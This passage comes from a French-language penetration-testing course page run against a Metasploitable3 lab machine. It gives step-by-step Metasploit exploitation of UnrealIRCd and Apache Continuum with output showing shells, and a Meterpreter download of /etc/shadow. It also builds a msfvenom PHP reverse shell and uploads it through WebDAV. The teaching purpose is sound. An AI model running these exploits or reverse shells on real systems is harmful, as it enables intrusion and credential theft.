+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/irc/unreal_ircd_3281_backdoor<span style="color:#f92672">)</span> &gt; set payload <span style="color:#ae81ff">5</span> </span></span></code></pre></div><p>Enfin, il faut s’assurer que toutes les options obligatoires ont les bonnes valeurs. Vous devrez définir les options suivantes (spécifiez les adresses IP correspondant aux vôtres):</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/irc/unreal_ircd_3281_backdoor<span style="color:#f92672">)</span> &gt; set rhosts 192.168.229.132
+</span></span><span style="display:flex;"><span>rhosts <span style="color:#f92672">=</span>&gt; 192.168.229.132
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/irc/unreal_ircd_3281_backdoor<span style="color:#f92672">)</span> &gt; set rport <span style="color:#ae81ff">6697</span>
+</span></span><span style="display:flex;"><span>rport <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">6697</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/irc/unreal_ircd_3281_backdoor<span style="color:#f92672">)</span> &gt; set lhost 192.168.229.129
+</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span>&gt; 192.168.229.129</span></span></code></pre></div><p>Exécutez ensuite le module. Vous devriez avoir un <em>shell</em> sur la victime :</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/irc/unreal_ircd_3281_backdoor<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP double handler on 192.168.229.129:4444
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.229.132:6697 - Connected to 192.168.229.132:6697...
+</span></span><span style="display:flex;"><span>    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
+</span></span><span style="display:flex;"><span>    :irc.TestIRC.net NOTICE AUTH :*** Couldn<span style="color:#960050;background-color:#1e0010">&#39;</span>t resolve your hostname; using your IP address inst
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.229.132:6697 - Sending backdoor command...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Accepted the first client connection...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Accepted the second client connection...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command: echo geWhE8TWq62KmzGn;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Writing to socket A
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Writing to socket B
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading from sockets...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading from socket A
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> A: <span style="color:#e6db74">&#34;geWhE8TWq62KmzGn\r\n&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Matching...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> B is input...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>192.168.229.129:4444 -&gt; 192.168.229.132:56526<span style="color:#f92672">)</span> at 2021-10-10 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>boba_fett
+</span></span><span style="display:flex;"><span>hostname
+</span></span><span style="display:flex;"><span>metasploitable3-ub1404</span></span></code></pre></div><p>Le shell obtenu est très rudimentaire. On peut l’améliorer avec la commande suivante (qui requiert cependant que python soit installé sur la cible) :</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span></span></span></code></pre></div><h3 id="port-8080">Port 8080</h3>
+<p>Au port 8080 on peut accéder à la page d’une application nommée « Continuum ». Quel module Metasploit permet d’exploiter une vulnérabilité sur cette application?</p>
+<p>Lorsque vous chargerez ce module, vous constaterez (avec <code>show payloads</code>) que Metasploit charge un payload par défaut : le shell <em>Meterpreter</em>. Vous n’avez donc pas besoin de spécifier un payload. Définissez les options du module et lancez l’exécution.</p>
+<h3 id="meterpreter--bref-aperçu">Meterpreter : bref aperçu</h3>
+<p>Meterpreter est un shell conçu pour Metasploit qui offre de nombreuses fonctionnalités très utiles, par exemple le téléchargement/téléversement de fichiers, des informations sur le système, manipulation des processus, etc.</p>
+<p>On peut voir les commandes disponibles dans le shell meterpreter en faisant <code>help</code>.</p>
+<p>Pour lancer une invite de commande minimaliste sur l’hôte distant, on peut utiliser la commande <code>shell</code> (puis ensuite <code>exit</code> pour revenir à <code>meterpreter</code>):</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">19551</span> created.
+</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">1</span> created.
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>cd /etc/
+</span></span><span style="display:flex;"><span>pwd
+</span></span><span style="display:flex;"><span>/etc
+</span></span><span style="display:flex;"><span>exit
+</span></span><span style="display:flex;"><span>meterpreter &gt;</span></span></code></pre></div><p>On peut télécharger des fichiers avec <code>download</code>:</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>meterpreter &gt; download /etc/shadow
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Downloading: /etc/shadow -&gt; shadow
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Downloaded 1.21 KiB of 1.21 KiB <span style="color:#f92672">(</span>100.0%<span style="color:#f92672">)</span>: /etc/shadow -&gt; shadow
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> download   : /etc/shadow -&gt; shadow
+</span></span><span style="display:flex;"><span>meterpreter &gt;</span></span></code></pre></div><p>La commande <code>background</code> permet de retourner à l’invite <em>msf</em>; <code>sessions</code> affiche les sessions actives et <code>sessions</code> suivi d’un nombre retourne à une session mise en arrière-plan:</p>
+<p>meterpreter &gt; background
+[*] Backgrounding session 1&hellip;
+msf6 exploit(linux/http/apache_continuum_cmd_exec) &gt; sessions</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Active sessions
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Id  Name  Type        Information                  Connection
+</span></span><span style="display:flex;"><span>  --  ----  ----        -----------                  ----------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">1</span>         meterpreter root@metasploitable3-ub1404  192.168.229.129:4444 -&gt;                              
+</span></span><span style="display:flex;"><span>                                                     192.168.229.132:56584 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/http/apache_continuum_cmd_exec<span style="color:#f92672">)</span> &gt; sessions <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 1...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt;</span></span></code></pre></div><h3 id="port-80">Port 80</h3>
+<p>Le service http est présent au port 80 : si on utilise <code>dirb</code> ou <code>gobuster</code> pour énumérer les répertoires qu’il contient on obtiendra ceci :</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 291<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 286<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 291<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/cgi-bin/             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 290<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/chat                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 316<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.229.132/chat/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/drupal               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 318<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.229.132/drupal/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/phpmyadmin           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 322<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.229.132/phpmyadmin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 295<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 319<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.229.132/uploads/<span style="color:#f92672">]</span></span></span></code></pre></div><p>Le répertoire <code>/uploads</code> pourrait correspondre à <em>WebDAV</em>, un service qui permet de transférer des fichiers sur un serveur http.</p>
+<p>En plus de modules d&rsquo;exploitation, Metasploit comprend de nombreux modules servant à énumérer ou détecter des vulnérabilités; un d’entre eux se nomme « webdav_scanner ». Cherchez-le et chargez-le avec la commande <code>use</code>.</p>
+<p>Définissez les options suivantes :</p>
+<ul>
+<li>RHOSTS : L’adresse IP de la cible</li>
+<li>PATH : /uploads/</li>
+</ul>
+<p>Puis lancez le module. Vous obtiendrez le résultat suivant :</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/http/webdav_scanner<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.229.132 <span style="color:#f92672">(</span>Apache/2.4.7 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">))</span> has WEBDAV ENABLED
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Auxiliary module execution completed</span></span></code></pre></div><p>Il est donc possible de déposer des fichiers sur le serveur: on devrait ainsi pouvoir lancer un shell inversé. Il ne semble cependant pas y avoir de module pour exploiter directement WebDAV sur Apache dans Metasploit: on devra donc fabriquer notre propre payload avec <code>msfvenom</code> et le déposer autrement.</p>
+<h3 id="_msfvenom_-1"><em>msfvenom</em></h3>
+<p>Un programme à utiliser en complément de Metasploit, <code>msfvenom</code> sert à générer des payloads de différents formats (exe, asp, dll, msi, jar…) à partir des modules de Metasploit. Ceci permet en quelque sorte d&rsquo;extraire des modules de Metasploit afin de les utiliser à l&rsquo;extérieur de celui-ci.</p>
+<p>Ici, on utilisera cette commande pour générer un fichier qu’on nommera <code>shell.php</code>. Ce sera un <em>shell</em> inversé basé sur <em>meterpreter</em>; les étapes sont les suivantes :</p>
+<ul>
+<li>Créer le <em>shell</em> avec <code>msfvenom</code></li>
+<li>Déposer sur le serveur WebDAV avec <code>cadaver</code> (un programme client pour WebDAV)</li>
+<li>Ouvrir un port d’écoute dans Metasploit</li>
+<li>Exécuter le <em>shell</em></li>
+</ul>
+<h5 id="créer-le-_shell_-avec-msfvenom">Créer le <em>shell</em> avec <code>msfvenom</code></h5>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ msfvenom -p php/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.229.129 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> &gt; shell.php</span></span></code></pre></div><h5 id="déposer-sur-le-serveur-webdav-avec-cadaver">Déposer sur le serveur WebDAV avec <code>cadaver</code></h5>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cadaver http://192.168.229.132/uploads/                                                                                    
+</span></span><span style="display:flex;"><span>dav:/uploads/&gt; put shell.php
+</span></span><span style="display:flex;"><span>Uploading shell.php to <span style="color:#e6db74">&#39;/uploads/shell.php&#39;</span>:
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#f92672">[=============================</span>&gt;<span style="color:#f92672">]</span> 100.0% of <span style="color:#ae81ff">1116</span> bytes succeeded.
+</span></span><span style="display:flex;"><span>dav:/uploads/&gt; exit
+</span></span><span style="display:flex;"><span>Connection to <span style="color:#e6db74">&#39;192.168.229.132&#39;</span> closed.</span></span></code></pre></div><h5 id="ouvrir-un-port-découte-dans-metasploit">Ouvrir un port d’écoute dans Metasploit</h5>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 &gt; use exploit/multi/handler
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set payload php/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set lhost 192.168.229.129
+</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span>&gt; 192.168.229.129
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run</span></span></code></pre></div><h5 id="exécuter-le-_shell_">Exécuter le <em>shell</em></h5>
+<p>Puisque vous avez déposé <code>shell.php</code> dans le répertoire <code>uploads</code> du serveur, pour l&rsquo;exécuter il faut ouvrir la page web correspondant et cliquer sur le fichier:</p>
+<p><a href="#R-image-aabbc8053e6786801a44aaaf71561d53" class="lightbox-link"><img alt="webdav" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/420-513/images/execshell.png" style=" height: auto; width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-aabbc8053e6786801a44aaaf71561d53"><img alt="webdav" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/420-513/images/execshell.png"></a></p>
+<p>Vous devriez obtenir un shell sur votre cible dans Metasploit.</p>
+<h2 id="références">Références</h2>
+<ul>
+<li>Tutoriel et documentation de Metasploit (par <em>Offensive Security</em>): <a href="https://www.offsec.com/metasploit-unleashed/" rel="external" target="_blank">https://www.offsec.com/metasploit-unleashed/</a></li>
+<li>Documentation officielle du fabricant (<em>Rapid7</em>): <a href="https://www.metasploit.com/" rel="external" target="_blank">https://www.metasploit.com/</a></li>
+</ul>
+
+            <footer class="footline">
+            </footer>
+          </article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <div id="R-header" class="default-animation">
+<svg width="200" height="35" viewBox="0 0 219.57 44.202" xmlns="http://www.w3.org/2000/svg"><g id="svgGroup" stroke-linecap="round" fill-rule="evenodd" font-size="9pt" stroke="#ffffff" stroke-width="0.25mm" fill="#ffffff" style="stroke:#ffffff;stroke-width:0.25mm;fill:#ffffff"><path d="M 136.695 33.866 L 137.605 33.476 Q 138.45 38.611 142.09 40.951 Q 145.463 43.12 150.512 43.279 A 25.707 25.707 0 0 0 151.32 43.291 A 15.103 15.103 0 0 0 154.751 42.917 A 11.923 11.923 0 0 0 157.918 41.699 Q 160.745 40.106 162.37 37.279 A 12.253 12.253 0 0 0 163.917 32.365 A 15.207 15.207 0 0 0 163.995 30.811 A 14.455 14.455 0 0 0 163.58 27.282 A 11.856 11.856 0 0 0 162.435 24.376 Q 160.875 21.581 158.08 20.021 A 12.265 12.265 0 0 0 153.626 18.584 A 15.479 15.479 0 0 0 151.645 18.461 Q 148.135 18.461 145.698 19.274 A 15.993 15.993 0 0 0 143.726 20.072 Q 142.709 20.569 141.896 21.178 A 9.58 9.58 0 0 0 141.668 21.354 Q 140.075 22.621 139.035 23.986 L 138.125 23.986 L 140.075 0.651 L 163.41 0.651 L 163.41 1.561 L 140.92 1.561 L 139.23 21.646 L 139.1 22.881 L 139.165 22.881 A 10.565 10.565 0 0 1 140.888 21.031 Q 142.046 20.039 143.618 19.176 Q 146.575 17.551 151.645 17.551 Q 155.61 17.551 158.6 19.241 Q 161.59 20.931 163.313 23.921 Q 165.035 26.911 165.035 30.811 A 14.875 14.875 0 0 1 164.601 34.454 A 13.099 13.099 0 0 1 164.027 36.206 Q 163.02 38.676 161.2 40.464 Q 159.38 42.251 156.878 43.226 A 14.289 14.289 0 0 1 153.175 44.106 A 17.646 17.646 0 0 1 151.32 44.201 A 22.296 22.296 0 0 1 146.778 43.759 A 16.677 16.677 0 0 1 141.797 41.894 Q 137.888 39.637 136.745 34.116 A 19.16 19.16 0 0 1 136.695 33.866 Z M 191.23 34.386 L 192.14 33.801 Q 192.725 36.661 194.545 38.806 A 11.743 11.743 0 0 0 198.417 41.773 A 14.029 14.029 0 0 0 199.192 42.121 A 14.984 14.984 0 0 0 202.651 43.067 A 20.18 20.18 0 0 0 205.725 43.291 Q 209.43 43.291 212.323 41.991 Q 215.215 40.691 216.873 38.156 A 9.97 9.97 0 0 0 218.311 34.48 A 13.661 13.661 0 0 0 218.53 31.981 A 11.636 11.636 0 0 0 218.293 29.567 Q 217.947 27.936 217.098 26.677 A 7.361 7.361 0 0 0 217.035 26.586 Q 215.54 24.441 213.038 23.401 A 13.623 13.623 0 0 0 209.155 22.443 A 16.682 16.682 0 0 0 207.48 22.361 L 205.108 22.361 A 22.974 22.974 0 0 0 204.663 22.365 Q 204.182 22.374 203.841 22.405 A 5.736 5.736 0 0 0 203.645 22.426 L 203.645 21.451 Q 204.36 21.516 205.367 21.516 L 207.285 21.516 A 12.644 12.644 0 0 0 210.486 21.132 A 9.095 9.095 0 0 0 214.663 18.786 A 9.07 9.07 0 0 0 217.175 14.015 A 13.257 13.257 0 0 0 217.425 11.376 A 12.561 12.561 0 0 0 217.03 8.141 A 9.02 9.02 0 0 0 214.37 3.706 Q 211.315 0.911 206.115 0.911 A 16.814 16.814 0 0 0 202.024 1.388 A 13.161 13.161 0 0 0 197.958 3.154 Q 194.545 5.396 193.375 9.296 L 192.4 8.776 Q 193.375 6.046 195.325 4.064 A 12.804 12.804 0 0 1 199.78 1.141 A 14.767 14.767 0 0 1 200.038 1.041 A 16.287 16.287 0 0 1 204.294 0.083 A 19.75 19.75 0 0 1 206.115 0.001 A 17.588 17.588 0 0 1 209.221 0.262 A 12.791 12.791 0 0 1 212.648 1.366 Q 215.41 2.731 216.938 5.266 A 10.42 10.42 0 0 1 218.241 8.791 A 14.271 14.271 0 0 1 218.465 11.376 Q 218.465 13.326 217.913 15.081 Q 217.36 16.836 216.32 18.266 Q 215.28 19.696 213.72 20.639 A 9.434 9.434 0 0 1 211.183 21.69 A 11.438 11.438 0 0 1 210.145 21.906 L 210.145 21.971 Q 212.225 22.101 213.948 22.881 Q 215.67 23.661 216.938 24.961 A 8.622 8.622 0 0 1 218.66 27.548 A 10.16 10.16 0 0 1 218.887 28.114 Q 219.57 29.966 219.57 32.241 A 12.097 12.097 0 0 1 219.066 35.792 A 10.402 10.402 0 0 1 217.782 38.514 A 11.918 11.918 0 0 1 213.111 42.605 A 14.14 14.14 0 0 1 212.907 42.706 A 14.867 14.867 0 0 1 208.363 44.04 A 18.955 18.955 0 0 1 205.855 44.201 A 20.558 20.558 0 0 1 201.466 43.756 A 14.723 14.723 0 0 1 196.17 41.504 Q 192.27 38.806 191.23 34.386 Z M 65.26 43.551 L 36.79 43.551 L 36.79 42.641 A 924.16 924.16 0 0 0 42.299 38.026 A 687.773 687.773 0 0 0 47.255 33.801 A 143.576 143.576 0 0 0 51.364 30.13 Q 53.535 28.111 55.348 26.229 Q 58.39 23.07 60.167 20.093 A 23.183 23.183 0 0 0 60.58 19.371 A 15.014 15.014 0 0 0 62.039 15.673 A 12.709 12.709 0 0 0 62.4 12.676 A 14.967 14.967 0 0 0 61.994 9.089 A 10.169 10.169 0 0 0 59.118 4.031 A 10.954 10.954 0 0 0 54.013 1.332 Q 52.311 0.924 50.309 0.911 A 20.352 20.352 0 0 0 50.18 0.911 Q 44.46 0.911 41.015 4.421 A 12.596 12.596 0 0 0 37.745 10.514 A 17.809 17.809 0 0 0 37.31 13.781 L 36.335 13.391 A 18.027 18.027 0 0 1 36.853 9.795 A 13.746 13.746 0 0 1 38.253 6.306 Q 39.975 3.316 43.03 1.659 A 13.527 13.527 0 0 1 47.429 0.206 A 17.81 17.81 0 0 1 50.18 0.001 A 18.992 18.992 0 0 1 53.166 0.226 A 14.69 14.69 0 0 1 55.672 0.846 A 11.597 11.597 0 0 1 58.747 2.436 A 10.559 10.559 0 0 1 59.832 3.349 Q 61.555 5.006 62.465 7.346 A 13.146 13.146 0 0 1 63.225 10.354 A 17.279 17.279 0 0 1 63.375 12.676 A 15.137 15.137 0 0 1 61.627 19.662 A 19.527 19.527 0 0 1 60.385 21.744 Q 58.061 25.154 54.185 28.918 A 78.507 78.507 0 0 1 51.838 31.104 Q 48.017 34.522 43.167 38.663 A 777.674 777.674 0 0 1 38.545 42.576 L 38.545 42.641 L 39.163 42.641 L 39.78 42.641 L 40.365 42.641 L 65.26 42.641 L 65.26 43.551 Z M 22.75 43.551 L 21.71 43.551 L 21.71 30.226 L 0 30.226 L 0 29.316 L 21.32 0.651 L 22.75 0.651 L 22.75 29.316 L 31.785 29.316 L 31.785 30.226 L 22.75 30.226 L 22.75 43.551 Z M 82.132 43.397 A 15.037 15.037 0 0 0 87.165 44.201 A 17.016 17.016 0 0 0 89.378 44.061 A 12.633 12.633 0 0 0 98.475 38.481 A 18.869 18.869 0 0 0 100.762 33.881 Q 101.635 31.36 102.054 28.272 A 46.023 46.023 0 0 0 102.44 22.101 A 47.711 47.711 0 0 0 102.169 16.869 Q 101.823 13.735 101.033 11.154 A 19.467 19.467 0 0 0 98.475 5.721 A 12.667 12.667 0 0 0 92.198 0.805 A 15.037 15.037 0 0 0 87.165 0.001 A 17.016 17.016 0 0 0 84.952 0.141 A 12.633 12.633 0 0 0 75.855 5.721 A 18.869 18.869 0 0 0 73.568 10.321 Q 72.695 12.842 72.276 15.93 A 46.023 46.023 0 0 0 71.89 22.101 A 47.711 47.711 0 0 0 72.161 27.333 Q 72.507 30.467 73.297 33.048 A 19.467 19.467 0 0 0 75.855 38.481 A 12.667 12.667 0 0 0 82.132 43.397 Z M 182.78 43.551 L 181.74 43.551 L 181.74 6.631 L 181.74 4.616 L 181.74 2.601 Q 179.79 5.786 176.703 7.899 A 25.411 25.411 0 0 1 172.28 10.339 A 22.319 22.319 0 0 1 170.365 11.051 L 170.04 10.206 Q 171.795 9.556 173.518 8.646 Q 175.24 7.736 176.8 6.534 Q 178.36 5.331 179.628 3.869 Q 180.895 2.406 181.74 0.651 L 182.78 0.651 L 182.78 43.551 Z M 87.165 43.291 A 14.464 14.464 0 0 0 90.923 42.825 A 11.246 11.246 0 0 0 94.932 40.854 Q 98.085 38.416 99.743 33.671 A 27.228 27.228 0 0 0 100.876 29.121 Q 101.253 26.835 101.359 24.208 A 52.266 52.266 0 0 0 101.4 22.101 A 47.842 47.842 0 0 0 101.167 17.24 Q 100.924 14.867 100.428 12.827 A 24.33 24.33 0 0 0 99.743 10.499 Q 98.182 6.063 95.298 3.643 A 11.763 11.763 0 0 0 94.932 3.349 Q 91.78 0.911 87.165 0.911 Q 82.615 0.911 79.43 3.349 A 13.003 13.003 0 0 0 76.258 6.927 Q 75.287 8.51 74.588 10.499 A 26.604 26.604 0 0 0 73.484 14.862 Q 72.93 18.118 72.93 22.101 Q 72.93 27.626 74.016 31.788 A 24.373 24.373 0 0 0 74.588 33.671 A 18.938 18.938 0 0 0 76.151 37.086 Q 77.386 39.171 79.076 40.571 A 11.707 11.707 0 0 0 79.43 40.854 A 11.779 11.779 0 0 0 85.223 43.172 A 15.453 15.453 0 0 0 87.165 43.291 Z M 1.17 29.316 L 21.71 29.316 L 21.71 5.721 L 21.71 3.739 L 21.71 1.756 L 21.645 1.756 Q 20.995 2.731 20.248 3.706 A 71.964 71.964 0 0 0 19.181 5.132 A 62.417 62.417 0 0 0 18.85 5.591 L 1.17 29.316 Z M 110.76 25.481 L 129.025 25.481 L 129.025 26.521 L 110.76 26.521 L 110.76 25.481 Z" vector-effect="non-scaling-stroke"/></g></svg>
+        </div>
+
+        <search>
+          <div class="searchbox default-animation">
+            <i class="fas fa-search" title="Search (CTRL+ALT+f)"></i>
+            <label class="a11y-only" for="R-search-by">Search</label>
+            <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+            <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-times" title="Clear search"></i></button>
+          </div>
+        </search>
+        <script>
+          var contentLangs=['fr'];
+        </script>
+        <script src="/420-513/js/auto-complete.js?1731362681" defer></script>
+        <script src="/420-513/js/lunr/lunr.min.js?1731362681" defer></script>
+        <script src="/420-513/js/lunr/lunr.stemmer.support.min.js?1731362681" defer></script>
+        <script src="/420-513/js/lunr/lunr.multi.min.js?1731362681" defer></script>
+        <script src="/420-513/js/lunr/lunr.fr.min.js?1731362681" defer></script>
+        <script src="/420-513/js/search.js?1731362681" defer></script>
+      </div>
+      <div id="R-homelinks" class="default-animation">
+        <hr class="padding">
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div id="R-topics">
+          <ul class="enlarge morespace collapsible-menu">
+          <li data-nav-id="/420-513/intro/index.html" class=""><a class="padding" href="/420-513/intro/index.html">1. Préalables</a><ul id="R-subsections-d5efd0a842116e4053b2a67d87eea20a" class="morespace collapsible-menu">
+          <li data-nav-id="/420-513/intro/ip/index.html" class=""><a class="padding" href="/420-513/intro/ip/index.html">Adressage IP</a></li>
+          <li data-nav-id="/420-513/intro/kali/index.html" class=""><a class="padding" href="/420-513/intro/kali/index.html">Kali linux</a></li>
+          <li data-nav-id="/420-513/intro/wiredump/index.html" class=""><a class="padding" href="/420-513/intro/wiredump/index.html">Wireshark et tcpdump</a></li>
+          <li data-nav-id="/420-513/intro/ssh/index.html" class=""><a class="padding" href="/420-513/intro/ssh/index.html">SSH et SCP</a></li>
+          <li data-nav-id="/420-513/intro/netcat/index.html" class=""><a class="padding" href="/420-513/intro/netcat/index.html">Netcat</a></li>
